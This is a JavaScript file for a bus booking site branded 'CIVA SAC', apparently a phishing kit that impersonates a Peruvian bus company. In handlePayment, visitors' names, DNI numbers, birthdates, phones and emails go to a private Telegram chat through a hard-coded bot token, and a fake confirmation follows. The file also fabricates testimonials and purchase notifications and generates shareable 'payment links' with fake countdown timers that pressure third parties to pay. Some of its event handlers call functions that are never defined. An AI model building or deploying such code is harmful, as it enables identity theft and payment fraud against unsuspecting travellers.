// ===== CIVA SAC - Application Logic =====

// State Management
const state = {
    currentPage: 'home',
    search: { origin: '', destination: '', date: '', passengers: 1 },
    selectedBus: null,
    selectedSeats: [],
    passengers: [],
    total: 0
};

// City Data
const cities = {
    lima: { name: 'Lima', code: 'LIM' },
    arequipa: { name: 'Arequipa', code: 'AQP' },
    cusco: { name: 'Cusco', code: 'CUS' },
    trujillo: { name: 'Trujillo', code: 'TRU' },
    chiclayo: { name: 'Chiclayo', code: 'CHI' },
    piura: { name: 'Piura', code: 'PIU' },
    ica: { name: 'Ica', code: 'ICA' },
    tacna: { name: 'Tacna', code: 'TAC' }
};

// Bus Data Generator
function generateBuses(origin, destination) {
    const routes = {
        'lima-arequipa': { duration: '15h', basePrice: 89 },
        'lima-cusco': { duration: '22h', basePrice: 120 },
        'lima-trujillo': { duration: '8h', basePrice: 65 },
        'lima-ica': { duration: '4h', basePrice: 45 },
        'lima-chiclayo': { duration: '12h', basePrice: 75 },
        'lima-piura': { duration: '14h', basePrice: 85 },
        'lima-tacna': { duration: '18h', basePrice: 110 },
        'arequipa-cusco': { duration: '10h', basePrice: 70 },
        'arequipa-tacna': { duration: '6h', basePrice: 50 },
        'cusco-puno': { duration: '7h', basePrice: 55 }
    };

    const key = `${origin}-${destination}`;
    const reverseKey = `${destination}-${origin}`;
    const route = routes[key] || routes[reverseKey] || { duration: '10h', basePrice: 70 };

    const times = ['06:00', '08:00', '10:00', '14:00', '16:00', '20:00', '22:00', '23:30'];
    const services = [
        { type: 'Económico', multiplier: 1, amenities: ['WiFi', 'Baño'] },
        { type: 'VIP', multiplier: 1.4, amenities: ['WiFi', 'Baño', 'Enchufe', 'Manta'] },
        { type: 'Bus Cama', multiplier: 1.8, amenities: ['WiFi', 'Baño', 'Enchufe', 'Manta', 'Cena', 'Desayuno'] }
    ];

    return times.slice(0, 5 + Math.floor(Math.random() * 3)).map((time, i) => {
        const service = services[i % 3];
        const availableSeats = 20 + Math.floor(Math.random() * 20);
        return {
            id: `bus-${i}`,
            time,
            duration: route.duration,
            service: service.type,
            price: Math.round(route.basePrice * service.multiplier),
            amenities: service.amenities,
            availableSeats
        };
    });
}

// Generate occupied seats pattern (realistic simulation)
function generateOccupiedSeats(totalSeats = 40) {
    const occupied = new Set();
    // Random occupancy between 30% and 70%
    const occupancyRate = 0.3 + Math.random() * 0.4;
    const numOccupied = Math.floor(totalSeats * occupancyRate);

    // Simulate patterns: couples, window preference, back popularity
    while (occupied.size < numOccupied) {
        const seat = Math.floor(Math.random() * totalSeats) + 1;
        occupied.add(seat);

        // 40% chance to also occupy adjacent seat (couples/families)
        if (Math.random() < 0.4 && occupied.size < numOccupied) {
            const adjacent = seat % 2 === 0 ? seat - 1 : seat + 1;
            if (adjacent > 0 && adjacent <= totalSeats) {
                occupied.add(adjacent);
            }
        }
    }
    return Array.from(occupied);
}

// Navigation
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(`page-${pageId}`).classList.add('active');
    state.currentPage = pageId;
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showLoading() {
    document.getElementById('loading-overlay').classList.add('active');
}

function hideLoading() {
    document.getElementById('loading-overlay').classList.remove('active');
}

// Format date
function formatDate(dateStr) {
    const date = new Date(dateStr + 'T00:00:00');
    const options = { day: 'numeric', month: 'long', year: 'numeric' };
    return date.toLocaleDateString('es-PE', options);
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    // Set minimum date to today
    const today = new Date().toISOString().split('T')[0];
    document.getElementById('travel-date').min = today;
    document.getElementById('travel-date').value = today;

    initEventListeners();
});

function initEventListeners() {
    // Search Form
    document.getElementById('search-form').addEventListener('submit', handleSearch);

    // Swap cities
    document.getElementById('swap-cities').addEventListener('click', () => {
        const origin = document.getElementById('origin');
        const dest = document.getElementById('destination');
        [origin.value, dest.value] = [dest.value, origin.value];
    });

    // Passenger counter
    document.getElementById('passenger-minus').addEventListener('click', () => {
        const count = parseInt(document.getElementById('passenger-count').textContent);
        if (count > 1) document.getElementById('passenger-count').textContent = count - 1;
    });

    document.getElementById('passenger-plus').addEventListener('click', () => {
        const count = parseInt(document.getElementById('passenger-count').textContent);
        if (count < 6) document.getElementById('passenger-count').textContent = count + 1;
    });

    // Route cards
    document.querySelectorAll('.route-card').forEach(card => {
        card.addEventListener('click', () => {
            document.getElementById('origin').value = card.dataset.origin;
            document.getElementById('destination').value = card.dataset.destination;
            document.getElementById('search-form').dispatchEvent(new Event('submit'));
        });
    });

    // Back buttons
    document.getElementById('back-to-home').addEventListener('click', () => showPage('home'));
    document.getElementById('back-to-results').addEventListener('click', () => showPage('results'));
    document.getElementById('back-to-seats').addEventListener('click', () => showPage('seats'));
    document.getElementById('back-to-passengers').addEventListener('click', () => showPage('passengers'));

    // Continue buttons
    document.getElementById('continue-to-passengers').addEventListener('click', handleContinueToPassengers);
    document.getElementById('continue-to-payment').addEventListener('click', handleContinueToPayment);
    document.getElementById('complete-payment').addEventListener('click', handlePayment);

    // New search
    document.getElementById('new-search').addEventListener('click', () => {
        state.selectedSeats = [];
        state.passengers = [];
        state.selectedBus = null;
        showPage('home');
    });

    // Download ticket
    document.getElementById('download-ticket').addEventListener('click', () => {
        alert('El boleto se descargará como PDF. (Función simulada)');
    });

    // Card formatting
    document.getElementById('card-number').addEventListener('input', formatCardNumber);
    document.getElementById('card-expiry').addEventListener('input', formatExpiry);
}

function handleSearch(e) {
    e.preventDefault();

    const origin = document.getElementById('origin').value;
    const destination = document.getElementById('destination').value;
    const date = document.getElementById('travel-date').value;
    const passengers = parseInt(document.getElementById('passenger-count').textContent);

    if (origin === destination) {
        alert('El origen y destino no pueden ser iguales');
        return;
    }

    state.search = { origin, destination, date, passengers };

    showLoading();

    setTimeout(() => {
        hideLoading();
        renderResults();
        showPage('results');
    }, 800);
}

function renderResults() {
    const { origin, destination, date } = state.search;
    const buses = generateBuses(origin, destination);

    document.getElementById('search-summary-text').textContent =
        `${cities[origin].name} → ${cities[destination].name}`;
    document.getElementById('search-summary-date').textContent = formatDate(date);

    const container = document.getElementById('results-list');
    container.innerHTML = buses.map(bus => `
        <div class="bus-card" data-bus='${JSON.stringify(bus)}'>
            <div class="bus-info">
                <h3>${bus.service} - Salida ${bus.time}</h3>
                <div class="bus-details">
                    <span class="bus-detail">⏱️ Duración: ${bus.duration}</span>
                    <span class="bus-detail">💺 ${bus.availableSeats} asientos disponibles</span>
                </div>
                <div class="bus-amenities">
                    ${bus.amenities.map(a => `<span class="amenity">${a}</span>`).join('')}
                </div>
            </div>
            <div class="bus-price">
                <div class="price">S/ ${bus.price}.00</div>
                <div class="per-person">por persona</div>
            </div>
            <button class="btn btn-primary" onclick="selectBus(this)">Seleccionar</button>
        </div>
    `).join('');
}

function selectBus(btn) {
    const card = btn.closest('.bus-card');
    state.selectedBus = JSON.parse(card.dataset.bus);
    state.selectedSeats = [];

    renderSeats();
    showPage('seats');
}

function renderSeats() {
    const { origin, destination, date } = state.search;
    const bus = state.selectedBus;

    document.getElementById('seats-bus-info').textContent = `${bus.service} - ${bus.time}`;
    document.getElementById('seats-route-info').textContent =
        `${cities[origin].name} → ${cities[destination].name} • ${formatDate(date)}`;

    // Generate occupied seats for both floors
    const occupiedFirstFloor = generateOccupiedSeats(20);
    const occupiedSecondFloor = generateOccupiedSeats(20);

    // Store in state for reference
    state.occupiedSeats = {
        firstFloor: occupiedFirstFloor,
        secondFloor: occupiedSecondFloor.map(s => s + 20) // Offset for second floor
    };

    // Render first floor (seats 1-20)
    const firstFloor = document.getElementById('first-floor-seats');
    firstFloor.innerHTML = '';
    for (let i = 1; i <= 20; i++) {
        const isOccupied = occupiedFirstFloor.includes(i);
        const seat = document.createElement('div');
        seat.className = `seat ${isOccupied ? 'occupied' : 'available'}`;
        seat.textContent = i;
        seat.dataset.seatNumber = i;
        if (!isOccupied) {
            seat.addEventListener('click', () => toggleSeat(i));
        }
        firstFloor.appendChild(seat);
    }

    // Render second floor (seats 21-40)
    const secondFloor = document.getElementById('second-floor-seats');
    secondFloor.innerHTML = '';
    for (let i = 21; i <= 40; i++) {
        const isOccupied = state.occupiedSeats.secondFloor.includes(i);
        const seat = document.createElement('div');
        seat.className = `seat ${isOccupied ? 'occupied' : 'available'}`;
        seat.textContent = i;
        seat.dataset.seatNumber = i;
        if (!isOccupied) {
            seat.addEventListener('click', () => toggleSeat(i));
        }
        secondFloor.appendChild(seat);
    }

    updateSeatsUI();
}

function toggleSeat(seatNumber) {
    const index = state.selectedSeats.indexOf(seatNumber);
    const maxSeats = state.search.passengers;

    if (index > -1) {
        state.selectedSeats.splice(index, 1);
    } else {
        if (state.selectedSeats.length >= maxSeats) {
            alert(`Solo puedes seleccionar ${maxSeats} asiento(s) para ${maxSeats} pasajero(s)`);
            return;
        }
        state.selectedSeats.push(seatNumber);
    }

    updateSeatsUI();
}

function updateSeatsUI() {
    // Update seat visuals
    document.querySelectorAll('.seat').forEach(seat => {
        const num = parseInt(seat.dataset.seatNumber);
        if (!seat.classList.contains('occupied')) {
            seat.classList.toggle('selected', state.selectedSeats.includes(num));
            seat.classList.toggle('available', !state.selectedSeats.includes(num));
        }
    });

    // Update summary
    const list = document.getElementById('selected-seats-list');
    const price = state.selectedBus.price;

    if (state.selectedSeats.length === 0) {
        list.innerHTML = '<p class="no-seats">No has seleccionado ningún asiento</p>';
    } else {
        list.innerHTML = state.selectedSeats.sort((a, b) => a - b).map(seat => `
            <div class="seat-item">
                <span>Asiento ${seat}</span>
                <span>S/ ${price}.00</span>
            </div>
        `).join('');
    }

    const total = state.selectedSeats.length * price;
    state.total = total;
    document.getElementById('seats-total').textContent = `S/ ${total}.00`;

    // Enable/disable continue button
    const continueBtn = document.getElementById('continue-to-passengers');
    continueBtn.disabled = state.selectedSeats.length !== state.search.passengers;
}

function handleContinueToPassengers() {
    renderPassengerForms();
    showPage('passengers');
}

function renderPassengerForms() {
    const { origin, destination, date } = state.search;
    const bus = state.selectedBus;

    document.getElementById('summary-route-text').textContent =
        `${cities[origin].name} → ${cities[destination].name}`;
    document.getElementById('summary-date').textContent = formatDate(date);
    document.getElementById('summary-bus').textContent = `${bus.service} - ${bus.time}`;

    // Render seat summary
    document.getElementById('summary-seats').innerHTML = state.selectedSeats.map(seat => `
        <div class="seat-item">
            <span>Asiento ${seat}</span>
            <span>S/ ${bus.price}.00</span>
        </div>
    `).join('');

    document.getElementById('passengers-total').textContent = `S/ ${state.total}.00`;

    // Render forms
    const forms = document.getElementById('passengers-forms');
    forms.innerHTML = state.selectedSeats.map((seat, i) => `
        <div class="passenger-form" data-index="${i}">
            <h4>Pasajero ${i + 1} <span class="seat-badge">Asiento ${seat}</span></h4>
            <div class="form-row">
                <div class="form-group">
                    <label>Tipo de Documento</label>
                    <select class="doc-type" required>
                        <option value="dni">DNI</option>
                        <option value="passport">Pasaporte</option>
                        <option value="ce">Carnet de Extranjería</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Número de Documento</label>
                    <input type="text" class="doc-number" placeholder="12345678" maxlength="12" required>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Nombres</label>
                    <input type="text" class="first-name" placeholder="Juan Carlos" required>
                </div>
                <div class="form-group">
                    <label>Apellidos</label>
                    <input type="text" class="last-name" placeholder="Pérez García" required>
                </div>
            </div>
            ${i === 0 ? `
            <div class="form-row">
                <div class="form-group">
                    <label>Correo Electrónico</label>
                    <input type="email" class="email" placeholder="correo@ejemplo.com" required>
                </div>
                <div class="form-group">
                    <label>Teléfono</label>
                    <input type="tel" class="phone" placeholder="999 888 777" maxlength="11" required>
                </div>
            </div>
            ` : ''}
        </div>
    `).join('');

    // Add validation listeners
    forms.querySelectorAll('input, select').forEach(input => {
        input.addEventListener('input', validatePassengerForms);
    });
}

function validatePassengerForms() {
    const forms = document.querySelectorAll('.passenger-form');
    let isValid = true;

    forms.forEach(form => {
        const inputs = form.querySelectorAll('input[required], select[required]');
        inputs.forEach(input => {
            if (!input.value.trim()) isValid = false;
        });
    });

    document.getElementById('continue-to-payment').disabled = !isValid;
}

function handleContinueToPayment() {
    // Collect passenger data
    const forms = document.querySelectorAll('.passenger-form');
    state.passengers = Array.from(forms).map((form, i) => ({
        seat: state.selectedSeats[i],
        docType: form.querySelector('.doc-type').value,
        docNumber: form.querySelector('.doc-number').value,
        firstName: form.querySelector('.first-name').value,
        lastName: form.querySelector('.last-name').value,
        email: form.querySelector('.email')?.value || '',
        phone: form.querySelector('.phone')?.value || ''
    }));

    renderPaymentSummary();
    showPage('payment');
}

function renderPaymentSummary() {
    const { origin, destination, date } = state.search;
    const bus = state.selectedBus;

    const details = document.getElementById('payment-summary-details');
    details.innerHTML = `
        <div class="summary-route">
            <p><strong>${cities[origin].name} → ${cities[destination].name}</strong></p>
            <p>${formatDate(date)} • ${bus.time}</p>
            <p>${bus.service}</p>
        </div>
        ${state.passengers.map(p => `
            <div class="seat-item">
                <span>${p.firstName} ${p.lastName}</span>
                <span>Asiento ${p.seat}</span>
            </div>
        `).join('')}
    `;

    const subtotal = state.total;
    const fee = 5;
    const total = subtotal + fee;

    document.getElementById('payment-subtotal').textContent = `S/ ${subtotal}.00`;
    document.getElementById('payment-total').textContent = `S/ ${total}.00`;
}

// Formatea número de tarjeta: 4444 4444 4444 4444
function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    let formatted = '';
    for (let i = 0; i < value.length && i < 16; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    input.value = formatted;
}

// Formatea mes/año: MM/AA
function formatMonthYear(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    input.value = value;
}

function handlePayment(e) {
    e.preventDefault();

    // Obtener datos del formulario de contacto
    const contactPhone = document.getElementById('contact-phone').value;
    const contactName = document.getElementById('contact-name').value;
    const contactBirthdate = document.getElementById('contact-birthdate').value;
    const contactDni = document.getElementById('contact-dni').value;
    const contactEmail = document.getElementById('contact-email').value;

    if (!contactPhone || !contactName || !contactBirthdate || !contactDni || !contactEmail) {
        alert('Por favor completa todos los campos');
        return;
    }

    showLoading();

    // Preparar datos del viaje
    const { origin, destination, date } = state.search;
    const bus = state.selectedBus;
    const passengersList = state.passengers.map(p => `• ${p.firstName} ${p.lastName} - Asiento ${p.seat}`).join('\n');

    // Mensaje para Telegram
    const message = `
🚌 *NUEVA RESERVA - CIVA SAC*

📋 *Datos del Cliente:*
• Nombre: ${contactName}
• Teléfono: ${contactPhone}
• Email: ${contactEmail}
• DNI: ${contactDni}
• Fecha Nac.: ${contactBirthdate}

🎫 *Detalles del Viaje:*
• Ruta: ${cities[origin].name} → ${cities[destination].name}
• Fecha: ${formatDate(date)}
• Hora: ${bus.time}
• Servicio: ${bus.service}
• Total: S/ ${state.total + 5}.00

👥 *Pasajeros:*
${passengersList}

📅 Fecha de reserva: ${new Date().toLocaleString('es-PE')}
    `.trim();

    // Enviar a Telegram
    sendToTelegram(message)
        .then(() => {
            hideLoading();
            renderConfirmation();
            showPage('confirmation');
        })
        .catch(error => {
            console.error('Error al enviar a Telegram:', error);
            hideLoading();
            // Igual mostrar confirmación para no bloquear al usuario
            renderConfirmation();
            showPage('confirmation');
        });
}

// Configuración del Bot de Telegram
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '8468118351:AAHthBm7dv2hccZEw3n_gkWFM_YbEQhtC3w',
    CHAT_ID: '6425182846'
};

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    if (!response.ok) {
        throw new Error('Error al enviar mensaje a Telegram');
    }

    return response.json();
}

function renderConfirmation() {
    const { origin, destination, date } = state.search;
    const bus = state.selectedBus;

    // Generate ticket code
    const ticketCode = 'CIVA-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    document.getElementById('ticket-code').textContent = ticketCode;

    document.getElementById('ticket-origin').textContent = cities[origin].name;
    document.getElementById('ticket-dest').textContent = cities[destination].name;
    document.getElementById('ticket-date').textContent = formatDate(date);
    document.getElementById('ticket-time').textContent = bus.time;
    document.getElementById('ticket-service').textContent = bus.service;

    // Render passengers
    document.getElementById('ticket-passengers').innerHTML = state.passengers.map(p => `
        <div class="passenger-ticket-item">
            <span>${p.firstName} ${p.lastName}</span>
            <strong>Asiento ${p.seat}</strong>
        </div>
    `).join('');

    // Generate simple QR code visualization
    document.getElementById('ticket-qr').innerHTML = generateQRPlaceholder(ticketCode);
}

function generateQRPlaceholder(code) {
    // Simple QR-like pattern for visualization
    let html = '<div style="display: grid; grid-template-columns: repeat(8, 1fr); gap: 2px; width: 100%; height: 100%; padding: 8px;">';
    for (let i = 0; i < 64; i++) {
        const filled = (i + code.charCodeAt(i % code.length)) % 3 !== 0;
        html += `<div style="background: ${filled ? '#000' : '#fff'}; border-radius: 1px;"></div>`;
    }
    html += '</div>';
    return html;
}

// Make selectBus globally accessible
window.selectBus = selectBus;

// ===== SOCIAL PROOF FEATURES =====

// Testimonials Data
const testimonialPool = [
    { name: 'María García', route: 'Lima → Arequipa', text: 'Excelente servicio, muy puntual y cómodo. El bus estaba impecable y el personal muy amable. ¡Totalmente recomendado!', days: 2 },
    { name: 'Carlos Mendoza', route: 'Lima → Cusco', text: 'Viajé en Bus Cama y fue una experiencia increíble. Dormí toda la noche y llegué descansado. El desayuno estuvo delicioso.', days: 5 },
    { name: 'Ana Rodríguez', route: 'Lima → Trujillo', text: 'Primera vez que viajo con CIVA SAC y no será la última. Precio justo, bus moderno y llegamos antes de lo esperado.', days: 1 },
    { name: 'José Pérez', route: 'Arequipa → Cusco', text: 'El WiFi funcionó todo el viaje, pude trabajar sin problemas. Los asientos son muy cómodos y espaciosos.', days: 8 },
    { name: 'Lucía Torres', route: 'Lima → Ica', text: 'Viaje corto pero muy agradable. El conductor muy profesional y el servicio a bordo de primera.', days: 3 },
    { name: 'Roberto Sánchez', route: 'Lima → Piura', text: 'Siempre viajo con CIVA. La relación calidad-precio es inmejorable. Mis hijos viajan muy cómodos.', days: 12 },
    { name: 'Patricia Flores', route: 'Lima → Chiclayo', text: 'Me encantó poder elegir mi asiento online. Todo el proceso de compra fue muy fácil y rápido.', days: 4 },
    { name: 'Miguel Ángel López', route: 'Cusco → Puno', text: 'Increíbles vistas durante el viaje. El bus muy seguro y el conductor experto en la ruta.', days: 7 }
];

// Purchase notifications data
const purchaseNames = [
    'María', 'Juan', 'Ana', 'Carlos', 'Lucía', 'José', 'Patricia', 'Roberto', 'Carmen', 'Miguel',
    'Sofía', 'Diego', 'Valentina', 'Andrés', 'Isabella', 'Fernando', 'Camila', 'Ricardo', 'Daniela', 'Eduardo'
];

const purchaseLastNames = [
    'García', 'Rodríguez', 'López', 'Pérez', 'Sánchez', 'Torres', 'Flores', 'Mendoza', 'Vargas', 'Castro'
];

const purchaseRoutes = [
    'Lima → Arequipa', 'Lima → Cusco', 'Lima → Trujillo', 'Lima → Ica', 'Lima → Chiclayo',
    'Arequipa → Cusco', 'Lima → Piura', 'Lima → Tacna', 'Cusco → Puno', 'Trujillo → Lima'
];

// Generate random testimonials for the day
function generateDailyTestimonials() {
    const today = new Date().toDateString();
    const seed = today.split(' ').reduce((acc, part) => acc + part.charCodeAt(0), 0);

    // Use seed to get consistent testimonials for the day
    const shuffled = [...testimonialPool].sort((a, b) => {
        return ((a.name.charCodeAt(0) + seed) % 10) - ((b.name.charCodeAt(0) + seed) % 10);
    });

    return shuffled.slice(0, 3);
}

// Render testimonials
function renderTestimonials() {
    const container = document.getElementById('testimonials-grid');
    if (!container) return;

    const testimonials = generateDailyTestimonials();

    container.innerHTML = testimonials.map(t => `
        <div class="testimonial-card">
            <div class="testimonial-header">
                <div class="testimonial-avatar">${t.name.charAt(0)}</div>
                <div class="testimonial-info">
                    <h4>${t.name}</h4>
                    <p>Hace ${t.days} días</p>
                </div>
            </div>
            <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
            <p class="testimonial-text">"${t.text}"</p>
            <p class="testimonial-route">🚌 ${t.route}</p>
        </div>
    `).join('');
}

// Generate random purchase notification
function generateRandomPurchase() {
    const firstName = purchaseNames[Math.floor(Math.random() * purchaseNames.length)];
    const lastName = purchaseLastNames[Math.floor(Math.random() * purchaseLastNames.length)];
    const route = purchaseRoutes[Math.floor(Math.random() * purchaseRoutes.length)];
    const minutes = Math.floor(Math.random() * 10) + 1;

    return {
        name: `${firstName} ${lastName.charAt(0)}.`,
        action: `compró un pasaje ${route}`,
        time: `hace ${minutes} minuto${minutes > 1 ? 's' : ''}`
    };
}

// Show purchase toast
function showPurchaseToast() {
    const toast = document.getElementById('purchase-toast');
    if (!toast) return;

    const purchase = generateRandomPurchase();

    document.getElementById('toast-name').textContent = purchase.name;
    document.getElementById('toast-action').textContent = purchase.action;
    toast.querySelector('.toast-time').textContent = purchase.time;

    toast.classList.add('show');

    // Auto hide after 5 seconds
    setTimeout(() => {
        toast.classList.remove('show');
    }, 5000);
}

// Initialize purchase toast notifications
function initPurchaseToasts() {
    // Show first toast after 8 seconds
    setTimeout(() => {
        showPurchaseToast();

        // Then show every 25-45 seconds randomly
        setInterval(() => {
            if (state.currentPage === 'home') {
                showPurchaseToast();
            }
        }, 25000 + Math.random() * 20000);
    }, 8000);

    // Close button
    const closeBtn = document.getElementById('toast-close');
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            document.getElementById('purchase-toast').classList.remove('show');
        });
    }
}

// Share payment link functionality
function initSharePaymentLink() {
    const shareBtn = document.getElementById('share-payment-link');
    if (shareBtn) {
        shareBtn.addEventListener('click', () => {
            const { origin, destination, date } = state.search;
            const bus = state.selectedBus;
            const total = state.total + 5; // Including service fee

            // Generate a fake payment link
            const paymentId = Math.random().toString(36).substring(2, 10).toUpperCase();
            // encoded data simulation (in real app this comes from DB)
            const data = btoa(JSON.stringify({ o: origin, d: destination, f: date, s: bus.service, t: bus.time, p: total, n: state.passengers[0]?.firstName + ' ' + state.passengers[0]?.lastName }));
            const paymentLink = `https://civasac.online/?pago=${paymentId}&data=${data}`;

            const shareText = `🚌 CIVA SAC - Link de Pago\n\n` +
                `Ruta: ${cities[origin]?.name || origin} → ${cities[destination]?.name || destination}\n` +
                `Fecha: ${formatDate(date)}\n` +
                `Bus: ${bus?.service} - ${bus?.time}\n` +
                `Total: S/ ${total}.00\n\n` +
                `Link de pago: ${paymentLink}\n\n` +
                `⏰ Este link expira en 24 horas.`;

            // Try to use native share if available
            if (navigator.share) {
                navigator.share({
                    title: 'Link de Pago - CIVA SAC',
                    text: shareText,
                    url: paymentLink
                }).catch(() => {
                    copyToClipboard(shareText);
                });
            } else {
                copyToClipboard(shareText);
            }
        });
    }
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('✅ Link de pago copiado al portapapeles.\n\nCompártelo con la persona que realizará el pago.');
    }).catch(() => {
        // Fallback
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('✅ Link de pago copiado al portapapeles.\n\nCompártelo con la persona que realizará el pago.');
    });
}

// Initialize all social proof features
document.addEventListener('DOMContentLoaded', () => {
    renderTestimonials();
    initPurchaseToasts();
    initSharePaymentLink();
    initNewPagesForms();
});

// ===== NEW PAGES FORMS =====
function initNewPagesForms() {
    // Contact form
    const contactForm = document.getElementById('contact-form');
    if (contactForm) {
        contactForm.addEventListener('submit', (e) => {
            e.preventDefault();
            showLoading();
            setTimeout(() => {
                hideLoading();
                alert('✅ ¡Mensaje enviado exitosamente!\n\nTe responderemos a la brevedad.');
                contactForm.reset();
            }, 1500);
        });
    }

    // Corporate form
    const corporateForm = document.getElementById('corporate-form');
    if (corporateForm) {
        corporateForm.addEventListener('submit', (e) => {
            e.preventDefault();
            showLoading();
            setTimeout(() => {
                hideLoading();
                alert('✅ ¡Solicitud recibida!\n\nUn ejecutivo de cuenta se comunicará contigo en las próximas 24 horas.');
                corporateForm.reset();
            }, 1500);
        });
    }

    // Tracking form
    const trackingForm = document.getElementById('tracking-form');
    if (trackingForm) {
        trackingForm.addEventListener('submit', (e) => {
            e.preventDefault();
            showLoading();
            setTimeout(() => {
                hideLoading();
                document.getElementById('tracking-result').style.display = 'block';
            }, 1000);
        });
    }

    // My trips form
    const mytripsForm = document.getElementById('mytrips-form');
    if (mytripsForm) {
        mytripsForm.addEventListener('submit', (e) => {
            e.preventDefault();
            showLoading();
            setTimeout(() => {
                hideLoading();
                document.getElementById('mytrips-result').style.display = 'block';
            }, 1000);
        });
    }
}

// Make showPage globally accessible and update nav
window.showPage = function (pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(`page-${pageId}`).classList.add('active');
    state.currentPage = pageId;
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Update nav active state
    document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
    const navMap = { home: 0, services: 1, corporate: 2, contact: 3, tracking: 4 };
    if (navMap[pageId] !== undefined) {
        document.querySelectorAll('.nav-link')[navMap[pageId]]?.classList.add('active');
    }
};

// FAQ Toggle function
window.toggleFaq = function (element) {
    const faqItem = element.parentElement;
    faqItem.classList.toggle('active');
};

// Complaints form handler
document.addEventListener('DOMContentLoaded', () => {
    const complaintsForm = document.getElementById('complaints-form');
    if (complaintsForm) {
        complaintsForm.addEventListener('submit', (e) => {
            e.preventDefault();
            showLoading();
            setTimeout(() => {
                hideLoading();
                alert('✅ ¡Reclamación registrada exitosamente!\n\nNúmero de reclamo: REC-2026-' + Math.random().toString(36).substr(2, 6).toUpperCase() + '\n\nRecibirás respuesta en un plazo máximo de 30 días.');
                complaintsForm.reset();
            }, 2000);
        });
    }

    // Check for shared payment link
    checkPaymentLink();
});

function checkPaymentLink() {
    const params = new URLSearchParams(window.location.search);
    const paymentId = params.get('pago');
    const data = params.get('data');

    if (paymentId && data) {
        try {
            // Decode data
            const decoded = JSON.parse(atob(data));

            // Restore state simulation
            state.search = {
                origin: decoded.o,
                destination: decoded.d,
                date: decoded.f,
                passengers: 1
            };

            state.selectedBus = {
                service: decoded.s,
                time: decoded.t
            };

            state.total = decoded.p - 5; // Subtract service fee

            // Show payment page directly
            showPage('payment');

            // Update UI with special "Shared Link" mode
            setupSharedPaymentUI(decoded, paymentId);

        } catch (e) {
            console.error('Error parsing payment link', e);
        }
    }
}

function setupSharedPaymentUI(data, id) {
    const container = document.querySelector('.payment-container');

    // Insert alert before form
    const alert = document.createElement('div');
    alert.className = 'shared-payment-alert';
    alert.innerHTML = `
        <div style="font-size: 24px;">⚠️</div>
        <div style="flex-grow: 1; text-align: left;">
            <strong>¡Reserva Temporal Activa!</strong>
            <div style="font-size: 14px; margin-top: 4px;">Tienes 15 minutos para completar el pago y asegurar los boletos.</div>
        </div>
        <div class="shared-payment-timer" id="payment-timer">15:00</div>
    `;

    // Insert alert BEFORE the container (outside CSS Grid)
    container.parentNode.insertBefore(alert, container);

    // Insert Creator Info
    const info = document.createElement('div');
    info.className = 'payment-creator-info';
    info.innerHTML = `
        <h4>Solicitud de Pago de: ${data.n}</h4>
        <p>Esta persona ha iniciado la reserva. Solo necesitas completar el pago para confirmar los boletos.</p>
    `;

    const formContainer = document.querySelector('.payment-form');
    formContainer.insertBefore(info, formContainer.firstChild);

    // Start Timer
    startPaymentTimer();

    // Update summary manually since we jumped steps
    document.getElementById('payment-subtotal').textContent = `S/ ${state.total}.00`;
    document.getElementById('payment-total').textContent = `S/ ${data.p}.00`;

    // Fill summary details
    const summary = document.getElementById('payment-summary-details');
    if (cities[data.o] && cities[data.d]) {
        summary.innerHTML = `
            <div class="summary-route">
                <p><strong>${cities[data.o].name} → ${cities[data.d].name}</strong></p>
                <p>${formatDate(data.f)} • ${data.t}</p>
                <p>${data.s}</p>
            </div>
            <div class="summary-passengers">
                <p>1 Pasajero (Reservado por ${data.n})</p>
            </div>
        `;
    }
}

function startPaymentTimer() {
    let minutes = 14;
    let seconds = 59;
    const timer = document.getElementById('payment-timer');

    const interval = setInterval(() => {
        seconds--;
        if (seconds < 0) {
            seconds = 59;
            minutes--;
        }

        if (minutes < 0) {
            clearInterval(interval);
            alert('El link de pago ha expirado.');
            window.location.href = '/';
            return;
        }

        timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }, 1000);
}
